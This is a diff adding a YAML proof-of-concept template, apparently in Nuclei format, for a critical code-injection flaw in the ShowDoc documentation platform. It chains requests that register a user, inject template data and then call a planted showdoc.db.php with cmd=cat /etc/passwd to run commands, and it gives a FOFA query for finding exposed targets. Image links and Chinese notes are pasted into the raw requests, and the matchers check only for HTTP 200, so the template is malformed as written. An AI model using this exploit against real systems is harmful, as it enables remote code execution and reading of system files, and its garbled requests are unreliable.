@@ -1,0 +1,65 @@
+id: poc-ikgwh79hv2g610qk
+info:
+  name: ShowDoc template_save存在代码注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikgwh79hv2g610qk'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ikgwh79hv2g610qk
+    fofa: app="ShowDoc"
+http:
+- raw:
+  - 'POST /server/index.php?s=/Api/Common/createCaptcha HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790000013006-9e82efaf-7b11-42ce-a2ac-64fc0f85ccaf.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /server/index.php?s=/api/common/showCaptcha&captcha_id=460 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790000013279-202f67d2-84b0-4ab6-a835-54b147f6b4c1.png)
+
+    注册合法用户名'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /server/index.php?s=/api/user/registerByVerify HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=seccheck_ok01&password=SecTest@2026&confirm_password=SecTest@2026&captcha_id=460&captcha=T366
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790000013557-ad10f67c-e548-46a4-9c14-fd99756c49e0.png)
+
+    携带token写入模板数据
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790000013827-7d1af42b-47c8-494b-b409-86c4ad9ab24e.png)
+
+    触发'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "GET /Sqlite/showdoc.db.php?cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n响应为 SQLite 二进制垃圾数据，中间夹带：\n|SHOWDOC_RCE_BGN|www-data|SHOWDOC_RCE_END|\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1790000014262-bbaabaac-9c86-4ccf-bf46-5076dc85086c.png)\nPS:使用官方默认 Sqlite/showdoc.db.php 的实例）在执行到触发步骤时会返回 HTTP 500 Internal Server Error，响应体为空,是因为数据库文件内部存在一张名为 \"<?php \" 的防护表：\n\nCREATE TABLE \"<?php \" (\n    `防止sqlite的数据库文件被直接下载` INTEGER\n)\n\n当 Web 服务器把 .db.php 交给 PHP 解析时，扫描器会把表名 \"<?php \" 识别为 PHP 起始标记，随后把后面的 SQLite 二进制数据当作 PHP 代码解析，必然触发语法错误 → HTTP 500。"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
